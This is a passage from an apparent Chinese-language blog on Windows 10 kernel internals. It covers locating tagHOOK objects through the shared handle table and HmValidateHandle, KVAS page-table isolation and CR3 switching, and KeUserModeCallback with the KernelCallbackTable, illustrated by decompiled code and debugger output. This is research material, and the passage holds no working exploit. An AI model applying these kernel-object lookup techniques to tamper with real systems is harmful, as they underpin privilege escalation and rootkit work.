TYPE_CURSOR:</span><br><span class="line">                     dwErrorCode = <span class="number">1402</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_SETWINDOWPOS:</span><br><span class="line">                     dwErrorCode = <span class="number">1405</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_HOOK:</span><br><span class="line">                     dwErrorCode = <span class="number">1404</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_ACCELTABLE:</span><br><span class="line">                     dwErrorCode = <span class="number">1403</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">default</span>:</span><br><span class="line">                     dwErrorCode = <span class="number">6</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              UserSetLastError(dwErrorCode);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> Object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 从伪代码来看，似乎只需要遍历gSharedInfo-&gt;aheList并取出HANDLEENTRY.bType为TYPE_HOOK的索引，即可从gpKernelHandleTable中找到我们想要的tagHOOK。</p>
<p>  但是，在15063以上的版本的Win10中，gpKernelHandleTable检索方法发生了变化，如：15063下tagHOOKObject&#x3D;gpKernelHandleTable[2 * Index]；18362下则变成了tagHOOKObject&#x3D;gpKernelHandleTable[3 * Index]。</p>
<p>  出于兼容性的考虑，笔者决定通过wUniq来生成钩子的句柄hHOOK &#x3D; Index | (gSharedInfo-&gt;aheList[Index].wUniq &lt;&lt; 0x10)，并调用HmValidateHandle来获取tagHOOK。虽然win32kbase.sys下HmValidateHandle没有导出且没有导出函数调用它，但win32kfull.sys里也有与其功能相同的HmValidateHandle，而且笔者发现user32!UnhookWindowsHookEx的底层调用win32kfull!NtUserUnhookWindowsHookEx中出现了对HmValidateHandle的调用.</p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h2 id="3-初步了解KVAS"><a href="#3-初步了解KVAS" class="headerlink" title="3 初步了解KVAS"></a>3 初步了解KVAS</h2><h3 id="什么是KVAS"><a href="#什么是KVAS" class="headerlink" title="什么是KVAS"></a>什么是KVAS</h3><p>内核虚拟地址影子（Kernel Virtual Address Shadow，由微软提出的一个术语，简称KVAS），类似于Linux上的KPTI（Kernel page-table isolation）内核页表隔离机制，即把进程页表按照成用户态、内核态独立的分割成两份，为了杜绝用户态通过一些旁路漏洞来窃取内核态的数据。KVAS在Windows10&#x2F;11上是默认开启的。</p>
<p>如果开启KVAS的话，应用程序会有两个CR3，即有PCB.DirectoryTableBase和PCB.UserDirectoryTableBase两个域。其中DirectoryTableBase域可以理解为内核CR3，能够访问内核物理页，而三环的Cr3（UserDirectoryTableBase）只映射了内核的KVASCODE区段的物理页（少数r3进入r0的入口），而没有映射其他区段的，因此通过3环的Cr3寻找内核TEXT段的物理页，最多只能找到PPE，而从PDE开始就没有映射了。</p>
<h3 id="分析KVAS初始化过程"><a href="#分析KVAS初始化过程" class="headerlink" title="分析KVAS初始化过程"></a>分析KVAS初始化过程</h3><p>分析KVAS的初始化过程，可以追溯到操作系统初始化函数 <em>KiSystemStartup（Windows操作启动入口点，由操作系统加载器（OS Loader）调用）</em>， 其中调用了KilnitializeBootStructures，会初始化操作系统所需的一些结构，其中就会通过PRCB判断是否初始化KVAS而调用KiEnableKvaShadowing，并设置 <em>KiKvaShadow &#x3D; 1</em>，并随后配置系统调用处理器为KiSystemCall32Shadow&#x2F;KiSystemCall64Shadow，而若没有开启KVAS则发生系统调用时调用的处理器是KiSystemCall32&#x2F;KiSystemCall64。</p>
<p><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiEnableKvaShadowing.jpg" alt="KiEnableKvaShadowing"></p>
<p>也就是当开启KVAS后syscall发生时会走KiSystemCall64Shadow交换页表</p>
<p><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiSystemCall64Shadow.png" alt="KiSystemCall64Shadow"></p>
<p>PS：实际上，不仅是系统调用函数，很多中断处理例程（如KiBreakPointTrap等），也有shadow版本</p>
<h3 id="dual-CR3"><a href="#dual-CR3" class="headerlink" title="dual CR3"></a>dual CR3</h3><p>先说结论：<strong>在Windows10下当特权级身份运行程序的时候，不会出现dual CR3情况，只有一个CR3（只有PCB.DirectoryTableBase，PCB.UserDirectoryTableBase为空）</strong></p>
<p>为了分析Windows内核页表隔离的操作流程，可以看Windows各中断例程代码。我们知道当中断发生时，需要从Ring3进入Ring0执行代码，这个过程肯定是要处理KVAS的问题的，以Int3中断处理例程KiBreakpointTrapShadow为例</p>
<p><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiBreakpointTrapShadow.jpg" alt="KiBreakpointTrapShadow"></p>
<p>v6.OffsetLow是PreviousMode，即发生中断时是属于哪个Mode。如果是UserMode，则会进入if体。在if体内，先执行了swapgs指令，交换GS寄存器与IA32_KERNEL_GS_BASE。其中，IA32_KERNEL_GS_BASE寄存器是一个MSR寄存器，用了保存kernel级别的数据结构指针，因为在这个位置，还没有映射内核内存（只映射了少数入口点），所以需要通过GS获得必要的信息。gs[0x9000]包含PML4基址的物理地址（KernelDirectoryTableBase），而gs[0x9018]则是一个标志位（ShadowFlags），标志是否开启KVAS，若开启则将KernelDirectoryTableBase写入CR3，以完成CR3的切换。那么决定是否转换页表的就是这个ShadowFlags，需要看一下这个位置是在哪里设置的。</p>
<p>KVAS这个东西是和进程相关的，也就是说gs[0x9018]这个标志位会在进&#x2F;线程发生切换的时候根据上下文的状态被设置。ntoskrnl中，切换上下文的函数 KiSwapContext 调用 SwapContext，其中会根据上下文设置该标志位以决定这条线程发生中断时是否需要转化页表。<br><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/SwapContext.jpg" alt="SwapContext"></p>
<p>在这部分代码中，会将PCB.DirectoryTableBase写入PRCB.KernelDirectoryTableBase，也就是前面看到的GS[0x9000]位置；并会依据KPROCESS-&gt;AddressPolicy来设置ShadowFlags（GS[0x9018]）, KPROCESS-&gt;AddressPolicy在进程创建时依据进程是否由管理员身份启动而设置（NtCreateProcess-&gt;PspAllocateThread-&gt;PspUserThreadStartup-&gt;PspDisablePrimaryTokenExchange-&gt;SeTokenIsAdmin&#x2F;SecureHandle-&gt;Process-&gt;Pcb.AddressPolicy &#x3D; 1），如果是管理员进程，则KPROCESS-&gt;AddressPolicy为1，ShadowFlags会被设置为2，若是普通进程，则ShadowFlags为1。 在中断发生时，会依据ShadowFlags判断是否要切换CR3到PCB.DirectoryTableBase。PCB.DirectoryTableBase中映射了内核内存，而PCB.UserDirectoryTableBase没有映射内核内存，而非特权级应用程序在三环中使用的时UserDirectoryTableBase，只有在中断时才会被切换到DirectoryTableBase从而达到内核页表隔离的目的。</p>
<p>关于非特权级应用程序具有dual CR3而特权级应用程序只有一个CR3（PCB.UserDirectoryTableBase为空）还在 <em>KiKernelSysretExit</em> 中有体现，该函数是系统调用完成后从Ring0返回三环的函数。<br><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiKernelSysretExit" alt="img"><br>可以看到对进程类型做了判断，如果是非特权级进程会获取到KPROCESS-&gt;UserDirectoryTableBase并填入CR3以恢复内核页表隔离。</p>
<p><a target="_blank" rel="noopener" href="http://www.qfrost.com/WindowsKernel/KVAS/">http://www.qfrost.com/WindowsKernel/KVAS/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/96505%E2%80%94%E2%80%94https://www.fortinet.com/blog/threat-research/a-deep-dive-analysis-of-microsoft-s-kernel-virtual-address-shadow-feature">https://www.anquanke.com/post/id/96505——https://www.fortinet.com/blog/threat-research/a-deep-dive-analysis-of-microsoft-s-kernel-virtual-address-shadow-feature</a></p>
<p><a target="_blank" rel="noopener" href="https://wumb0.in/windows-10-kvas-and-software-smep.html">https://wumb0.in/windows-10-kvas-and-software-smep.html</a></p>
<p><a target="_blank" rel="noopener" href="https://msrc-blog.microsoft.com/2018/03/23/kva-shadow-mitigating-meltdown-on-windows/">https://msrc-blog.microsoft.com/2018/03/23/kva-shadow-mitigating-meltdown-on-windows/</a></p>
<p><a target="_blank" rel="noopener" href="https://businessresources.bitdefender.com/hubfs/noindex/Bitdefender-WhitePaper-SWAPGS.pdf">https://businessresources.bitdefender.com/hubfs/noindex/Bitdefender-WhitePaper-SWAPGS.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://back.engineering/29/03/2021/">https://back.engineering/29/03/2021/</a></p>
<p><a target="_blank" rel="noopener" href="https://caslab.csl.yale.edu/tutorials/asplos2021/asplos2021_tutorial_part1_public.pdf">https://caslab.csl.yale.edu/tutorials/asplos2021/asplos2021_tutorial_part1_public.pdf</a></p>
<h2 id="4-User-Mode-CallBack"><a href="#4-User-Mode-CallBack" class="headerlink" title="4 User-Mode CallBack"></a>4 User-Mode CallBack</h2><p>Windows 一共提供三种用户回调的方式，允许从内核执行的函数逐步调用到用户空间的函数。</p>
<ol>
<li>User-Mode APC Execute。</li>
<li>User-Mode Exception Hander。</li>
<li>User-Mode CallBack。</li>
</ol>
<p> <strong>注意</strong>：前两种先前模式 <code>PreviousMode = UserMode(1)</code>，后最后一种先前模式 <code>PreviousMode = KernelMode(0)</code>。也就是说，用户回调（User-Mode CallBack）是从 R0 主动发起的，最终也将回到 R0。</p>
<p>不管 <code>win32kfull</code> 中的哪一个函数发起的用户回调，都需要调用到 <code>nt!KeUserModeCallback</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KeUserModeCallback</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  ULONG     ApiNumber,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  PVOID     InputBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  ULONG     InputLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  OUT PVOID    *OutputBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  PULONG    OutputLength</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br></pre></td></tr></table></figure>



<ul>
<li>ApiNumber：这是用户空间函数在 <code>User32!apfnDispatch</code> 或 <code>PEB.KernelCallbackTable</code> 回调表的索引。</li>
<li>InputBuffer：是一块缓冲区，用来存放从 0 环带到 3 环的数据（参数）。针对不同的回调函数，该缓冲区中的结构不同。</li>
<li>InputLength：指定参数 2 <code>InputBuffer</code> 的长度，大小为字节。</li>
<li>OutputBuffer：当回调函数从 3 环返回时，从 3 环带回来的数据就存放在里面。是一个二级指针，类似于 ESP、EBP 等。</li>
<li>OutputLength：输出缓冲区的大小，从 3 环带回来的缓冲区数据大小。单位是字节。</li>
</ul>
<blockquote>
<p>本节以 Windows 10 x86 19041 为例。</p>
</blockquote>
<p>用户回调主要涉及到的函数：</p>
<p><img data-src="https://s2.loli.net/2022/10/17/qlS4ixbLKZfuv1o.png" alt="32.png"></p>
<p>调用过程如下：</p>
<p><img data-src="https://s2.loli.net/2022/10/17/rKCBDAQFqglvf9j.png" alt="31.png"></p>
<h3 id="4-1-参数解释"><a href="#4-1-参数解释" class="headerlink" title="4.1 参数解释"></a>4.1 参数解释</h3><h4 id="ApiNumber"><a href="#ApiNumber" class="headerlink" title="ApiNumber"></a>ApiNumber</h4><p>进程中初始化 <code>USER32.dll</code> 期间，会根据全局指针 <code>User32!apfnDispatch</code> 将其地址复制到进程环境块 <code>PEB.KernelCallbackTable</code>。这个表里面存的函数地址即为用户回调函数。在学习共享内存区（Section）时知道，所有进程共享一份可执行文件映射的物理内存页，对于系统 DLL，其物理页映射到所有进程虚拟地址空间起始地址都是一样的（非系统文件映射的起始地址不一定相同）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment">kd&gt; dt nt!_PEB @$peb -y KernelCallbackTable</span></span><br><span class="line"><span class="comment">   +0x02c KernelCallbackTable : 0x77571000 Void</span></span><br><span class="line"><span class="comment">***/</span></span><br><span class="line">kd&gt; ?User32!apfnDispatch</span><br><span class="line">Evaluate expression: <span class="number">2002194432</span> = <span class="number">77571000</span></span><br><span class="line"></span><br><span class="line">kd&gt; dds <span class="number">77571000</span> L20</span><br><span class="line"><span class="number">77571000</span>  <span class="number">7758</span>d820 user32!__fnCOPYDATA</span><br><span class="line"><span class="number">77571004</span>  <span class="number">775e6</span>f50 user32!__fnCOPYGLOBALDATA</span><br><span class="line"><span class="number">77571008</span>  <span class="number">77590</span>ca0 user32!__fnDWORD</span><br><span class="line"><span class="number">7757100</span>c  <span class="number">775951</span>a0 user32!__fnNCDESTROY</span><br><span class="line"><span class="number">77571010</span>  <span class="number">7757</span>a3d0 user32!__fnDWORDOPTINLPMSG</span><br><span class="line"><span class="number">77571014</span>  <span class="number">775e7690</span> user32!__fnINOUTDRAG</span><br><span class="line"><span class="number">77571018</span>  <span class="number">77579620</span> user32!__fnGETTEXTLENGTHS</span><br><span class="line"><span class="number">7757101</span>c  <span class="number">775e7320</span> user32!__fnINCNTOUTSTRING</span><br><span class="line"><span class="number">77571020</span>  <span class="number">775e73</span>c0 user32!__fnINCNTOUTSTRINGNULL</span><br><span class="line"><span class="number">77571024</span>  <span class="number">775e7460</span> user32!__fnINLPCOMPAREITEMSTRUCT</span><br><span class="line"><span class="number">77571028</span>  <span class="number">77593450</span> user32!__fnINLPCREATESTRUCT</span><br><span class="line"><span class="number">7757102</span>c  <span class="number">775e74</span>b0 user32!__fnINLPDELETEITEMSTRUCT</span><br><span class="line"><span class="number">77571030</span>  <span class="number">775e7500</span> user32!__fnINLPDRAWITEMSTRUCT</span><br><span class="line"><span class="number">77571034</span>  <span class="number">775e7560</span> user32!__fnINLPHELPINFOSTRUCT</span><br><span class="line"><span class="number">77571038</span>  <span class="number">775e7560</span> user32!__fnINLPHELPINFOSTRUCT</span><br><span class="line"><span class="number">7757103</span>c  <span class="number">775e7630</span> user32!__fnINLPMDICREATESTRUCT</span><br><span class="line"><span class="number">77571040</span>  <span class="number">775e76</span>e0 user32!__fnINOUTLPMEASUREITEMSTRUCT</span><br><span class="line"><span class="number">77571044</span>  <span class="number">77594</span>de0 user32!__fnINLPWINDOWPOS</span><br><span class="line"><span class="number">77571048</span>  <span class="number">77595500</span> user32!__fnINOUTLPPOINT5</span><br><span class="line"><span class="number">7757104</span>c  <span class="number">77579730</span> user32!__fnINOUTLPSCROLLINFO</span><br><span class="line"><span class="number">77571050</span>  <span class="number">77597</span>d90 user32!__fnINOUTLPRECT</span><br><span class="line"><span class="number">77571054</span>  <span class="number">77594940</span> user32!__fnINOUTNCCALCSIZE</span><br><span class="line"><span class="number">77571058</span>  <span class="number">77579730</span> user32!__fnINOUTLPSCROLLINFO</span><br><span class="line"><span class="number">7757105</span>c  <span class="number">775e77</span>d0 user32!__fnINPAINTCLIPBRD</span><br><span class="line"><span class="number">77571060</span>  <span class="number">775e7840</span> user32!__fnINSIZECLIPBRD</span><br><span class="line"><span class="number">77571064</span>  <span class="number">775790</span>a0 user32!__fnINDESTROYCLIPBRD</span><br><span class="line"><span class="number">77571068</span>  <span class="number">7758</span>d7c0 user32!__fnINSTRING</span><br><span class="line"><span class="number">7757106</span>c  <span class="number">7758</span>d7c0 user32!__fnINSTRING</span><br><span class="line"><span class="number">77571070</span>  <span class="number">7758f</span>9a0 user32!__fnINDEVICECHANGE</span><br><span class="line"><span class="number">77571074</span>  <span class="number">7758</span>d640 user32!__fnPOWERBROADCAST</span><br><span class="line"><span class="number">77571078</span>  <span class="number">77594f</span>a0 user32!__fnINLPUAHDRAWMENU</span><br><span class="line"><span class="number">7757107</span>c  <span class="number">7757</span>aa80 user32!__fnOPTOUTLPDWORDOPTOUTLPDWORD</span><br></pre></td></tr></table></figure>



<h4 id="InputBuffer"><a href="#InputBuffer" class="headerlink" title="InputBuffer"></a>InputBuffer</h4><p>从 <code>win32kfull</code> 中不同的函数发起的 <code>KeUserModeCallback</code> 调用，<code>InputBuffer</code> 中会存放不同的结构。但是 <code>InputBuffer</code> 一般由两部分组成：固定部分（fix）、可变部分（variable）。</p>
<p>具体可以参考：《<a target="_blank" rel="noopener" href="https://www.stormshield.com/news/how-to-run-userland-code-from-the-kernel-on-windows/">How to run userland code from the kernel on Windows</a>》、《<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184233">KeUserModeCallback 过程详细分析</a>》。</p>
<h3 id="4-2-KeUserModeCallback-函数分析"><a href="#4-2-KeUserModeCallback-函数分析" class="headerlink" title="4.2 KeUserModeCallback 函数分析"></a>4.2 KeUserModeCallback 函数分析</h3><p>该函数主要做以下几件事：</p>
<ol>
<li><p>状态、标志判断。</p>
<p>KTHREAD.CalloutActive &#x3D;&#x3D; 0<br>IRQL &#x3D;&#x3D; PASSIVE_LEVEL(0)<br>ApcStateIndex &#x3D;&#x3D; 0（未挂靠）<br>KernelApcDisable &#x3D;&#x3D; 0（未禁用）</p>
</li>
<li><p>新建一个内核栈，用来保存当前线程环境信息。</p>
<p>在 Windows XP 中每次回调前，都会将内核栈提升，然后将当前的线程信息保存起来。但是涉及到多次 R0-R3 递归嵌套调用，递归调用回调栈空间会被很快耗尽。从 Vista 以后，每次回调前都会使用函数 <code>MmCreateKernelStack</code> 来新建一个内核栈，将当前线程的 <code>TrapFrame</code> 和线程堆栈信息保存起来，方便从 3 环返回回来时让 <code>nt!NtCallbackReturn(x, x, x)</code> 来使用。</p>
</li>
</ol>
<h4 id="KSTACK-CONTROL"><a href="#KSTACK-CONTROL" class="headerlink" title="KSTACK_CONTROL"></a>KSTACK_CONTROL</h4><p>函数 <code>MmCreateKernelStack</code> 返回来的堆栈，<code>KeUserModeCallback</code> 会向其中填充：<code>_KTRAP_FRAME</code>，<code>_KSTACK_CONTROL</code> 结构信息。</p>
<p>实际上在 Windows 7 中这两个结构包含在 <code>_KSTACK_AREA</code> 中，但是 Windows 10 取消了。所以我自己定义了一个结构 <code>_KSTACK_CONTROL_WIN10</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xAC bytes (sizeof)</span></span><br><span class="line"><span class="keyword">typedef</span> _KSTACK_CONTROL_WIN10</span><br><span class="line">&#123;</span><br><span class="line">  KTRAP_FRAME TrapFrame;</span><br><span class="line">  KSTACK_CONTROL StackControl;</span><br><span class="line">&#125;KSTACK_CONTROL_WIN10;</span><br></pre></td></tr></table></figure>

<p>在 Windows 10 x86 中，<code>KSTACK_CONTROL</code> 结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x20 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KSTACK_CONTROL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG StackBase;                                                        <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG ActualLimit;                                                  <span class="comment">//0x4</span></span><br><span class="line">        ULONG StackExpansion:<span class="number">1</span>;                                             <span class="comment">//0x4</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTRAP_FRAME</span>* <span class="title">PreviousTrapFrame</span>;</span>                                 <span class="comment">//0x8</span></span><br><span class="line">    VOID* PreviousExceptionList;                                            <span class="comment">//0xc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KERNEL_STACK_SEGMENT</span> <span class="title">Previous</span>;</span>                                  <span class="comment">//0x10</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>在 Windows 10 x86 中，<code>KERNEL_STACK_SEGMENT</code> 结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KERNEL_STACK_SEGMENT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG StackBase;                                                        <span class="comment">//0x0</span></span><br><span class="line">    ULONG StackLimit;                                                       <span class="comment">//0x4</span></span><br><span class="line">    ULONG KernelStack;                                                      <span class="comment">//0x8</span></span><br><span class="line">    ULONG InitialStack;                                                     <span class="comment">//0xc</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>





<h4 id="KeUserModeCallback源码分析"><a href="#KeUserModeCallback源码分析" class="headerlink" title="KeUserModeCallback源码分析"></a>KeUserModeCallback源码分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span 